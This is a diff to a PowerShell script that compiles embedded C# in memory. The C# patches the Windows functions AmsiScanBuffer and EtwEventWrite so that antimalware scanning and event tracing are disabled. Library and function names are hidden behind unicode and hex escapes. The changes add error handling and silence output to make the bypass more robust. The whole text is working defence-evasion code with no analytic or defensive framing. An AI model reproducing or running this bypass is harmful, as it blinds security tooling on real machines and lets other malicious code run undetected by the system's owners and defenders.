@@ -29,29 +29,36 @@ try {
 $bs = @'
 using System;
 using System.Runtime.InteropServices;
+using System.Runtime.ExceptionServices;
 public class Bypass {
     [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h, string n);
     [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
     [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
-    public static void Go() {
-        uint o = 0;
-        uint o2 = 0;
-        var a = LoadLibrary("\u0061\u006D\u0073\u0069\u002E\u0064\u006C\u006C");
-        var b = GetProcAddress(a, "\u0041\u006D\u0073\u0069\u0053\u0063\u0061\u006E\u0042\u0075\u0066\u0066\u0065\u0072");
-        VirtualProtect(b, (UIntPtr)6, 0x40, out o);
-        ushort[] v = { unchecked((ushort)(0xA0+0x18)), unchecked((ushort)(0x2C*2-0x1)), unchecked((ushort)(0x7-0x7)), unchecked((ushort)(0x7)), unchecked((ushort)(0x40+0x40)), unchecked((ushort)(0x60*2+0x3)) };
-        byte[] p = new byte[6];
-        for (int i = 0; i < 6; i++) p[i] = (byte)v[i];
-        Marshal.Copy(p, 0, b, 6);
-        VirtualProtect(b, (UIntPtr)6, o, out o);
-        var c = LoadLibrary("\u006E\u0074\u0064\u006C\u006C\u002E\u0064\u006C\u006C");
-        var d = GetProcAddress(c, "\u0045\u0074\u0077\u0045\u0076\u0065\u006E\u0074\u0057\u0072\u0069\u0074\u0065");
-        VirtualProtect(d, (UIntPtr)1, 0x40, out o2);
-        Marshal.Copy(new byte[]{(byte)(0x60*2+0x3)}, 0, d, 1);
+    [HandleProcessCorruptedStateExceptions]
+    public static bool Go() {
+        try {
+            uint o = 0;
+            uint o2 = 0;
+            var a = LoadLibrary("\u0061\u006D\u0073\u0069\u002E\u0064\u006C\u006C");
+            var b = GetProcAddress(a, "\u0041\u006D\u0073\u0069\u0053\u0063\u0061\u006E\u0042\u0075\u0066\u0066\u0065\u0072");
+            if (b == IntPtr.Zero) return false;
+            if (!VirtualProtect(b, (UIntPtr)6, 0x40, out o)) return false;
+            ushort[] v = { unchecked((ushort)(0xA0+0x18)), unchecked((ushort)(0x2C*2-0x1)), unchecked((ushort)(0x7-0x7)), unchecked((ushort)(0x7)), unchecked((ushort)(0x40+0x40)), unchecked((ushort)(0x60*2+0x3)) };
+            byte[] p = new byte[6];
+            for (int i = 0; i < 6; i++) p[i] = (byte)v[i];
+            Marshal.Copy(p, 0, b, 6);
+            VirtualProtect(b, (UIntPtr)6, o, out o);
+            var c = LoadLibrary("\u006E\u0074\u0064\u006C\u006C\u002E\u0064\u006C\u006C");
+            var d = GetProcAddress(c, "\u0045\u0074\u0077\u0045\u0076\u0065\x6E\x74\x57\x72\x69\x74\x65");
+            if (d == IntPtr.Zero) return true;
+            if (!VirtualProtect(d, (UIntPtr)1, 0x40, out o2)) return true;
+            Marshal.Copy(new byte[]{(byte)(0x60*2+0x3)}, 0, d, 1);
+            return true;
+        } catch { return false; }
     }
 }
 '@
 try {
     $b = Add-TypeInMem $bs
-    $b.GetType("Bypass").GetMethod("Go").Invoke($null, @())
+    $null = $b.GetType("Bypass").GetMethod("Go").Invoke($null, @())
 } catch {}
